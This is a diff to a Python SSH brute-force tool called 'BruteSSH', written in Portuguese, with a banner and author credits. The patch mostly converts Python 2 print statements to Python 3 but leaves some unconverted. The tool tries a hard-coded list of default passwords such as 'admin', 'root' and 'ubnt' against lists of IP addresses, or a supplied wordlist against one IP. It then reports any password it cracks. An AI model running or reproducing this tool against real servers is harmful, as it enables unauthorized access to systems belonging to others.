@@ -8,7 +8,7 @@ try:
     import paramiko
 except:
     os.system("clear")
-    print "Instale a lib paramiko "
+    print("Instale a lib paramiko ")
     quit()
 
 # Conecções....
@@ -26,7 +26,7 @@ def Sistema():
 
 
 def Banner():
-    print """\033[1;37m
+    print("""\033[1;37m
     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗██╗  ██╗██╗  ██╗
     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██║  ██║██║  ██║
     ██████╔╝██████╔╝██║   ██║   ██║   █████╗      ███████╗███████║███████║
@@ -35,7 +35,7 @@ def Banner():
     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝\033[0m
 \033[0;31m      Tamo junto: Anderson, Raphael e OverKiller <3 
                                   By: Pedro Souza 
-    \033[0m"""
+    \033[0m""")
 
 
 def Lista(ips):
@@ -43,32 +43,34 @@ def Lista(ips):
     Banner()
     for ip in ips:
         ip = ip.replace("\n", "").replace("\r", "")
-        print "\033[1;31m-------------------: Testando: " + ip
+        print("\033[1;31m-------------------: Testando: " + ip)
         for senha in ['admin', 'root', 'admin123', '@adm1in', '@admin', 'ubnt']:
             try:
                 ssh.connect(ip, port=porta, username=user, password=senha)
-                print "\033[1;32mPow! Pow! Pow! senha do Server: " + senha + "\033[0m"
+                print(
+                    "\033[1;32mPow! Pow! Pow! senha do Server: " + senha + "\033[0m")
                 break
             except KeyboardInterrupt:
-                print "\033[1;37m\nCnacelando Brute Force...",
-                print "Bye\033[0m"
+                print("\033[1;37m\nCnacelando Brute Force...")
+                print("Bye\033[0m")
                 quit()
             except paramiko.AuthenticationException, error:
-                print "\033[1;35mPassword incorreto: " + senha
+                print("\033[1;35mPassword incorreto: " + senha)
             except:
-                print "\033[1;37mConexão negada!\033[0m"
+                print("\033[1;37mConexão negada!\033[0m")
                 break
 
 
 def Senhas(senha, ip):
     Sistema()
     Banner()
-    print "\033[1;31m-------------------- Brute Force: " + ip
+    print("\033[1;31m-------------------- Brute Force: " + ip)
     for i in senha:
         i = i.replace("\n", "").replace("\r", "")
         try:
             ssh.connect(ip, port=porta, username=user, password=i)
-            print "\033[1;32mPow! PoW! Pow! senha do Server: " + senha + "\033[0m"
+            print("\033[1;32mPow! PoW! Pow! senha do Server: " +
+                  senha + "\033[0m")
             break
         except KeyboardInterrupt:
             print "\033[1;37m\nCnacelando Brute Force...",
@@ -103,11 +105,11 @@ def Argumentos():
         Senhas(senha, ip)
     else:
         print """
-		Use "./BruteSSH --tipo lista --lista listaIP.txt"
-		Esses exemplo usa uma lista de SSH para tentar o Brute Force com palavras padrões.
-		Ou "./BruteSSH.py --tipo senha --senha listaSenhas.txt --ip 192.168.0.1" 
-		Esse já tenta o Brute Force em um determinado IP com uma lista de senha que o usuário dispõe. 
+        Use "./BruteSSH --tipo lista --lista listaIP.txt"
+        Esses exemplo usa uma lista de SSH para tentar o Brute Force com palavras padrões.
+        Ou "./BruteSSH.py --tipo senha --senha listaSenhas.txt --ip 192.168.0.1" 
+        Esse já tenta o Brute Force em um determinado IP com uma lista de senha que o usuário dispõe. 
 
-		"""
+        """
 Sistema()
 Argumentos()
